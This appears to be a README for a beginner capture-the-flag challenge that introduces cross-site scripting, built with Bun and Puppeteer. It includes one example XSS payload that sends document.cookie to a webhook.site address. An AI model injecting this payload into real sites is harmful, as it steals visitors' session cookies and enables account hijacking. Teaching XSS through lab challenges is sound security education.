# Web Hacker

The `web-hacker` challenge is a very simple introduction to XSS.
It guides you through what XSS is, and suggests how to create a payload.
An example payload here: `<img src="" onerror="fetch('https://webhook.site/[your webhook]?c=' + document.cookie)" />`.
The owner of the webhook would then be able to see the flag in the query parameters.

Behind the scenes it uses Bun and Puppeteer to create an automated browser.
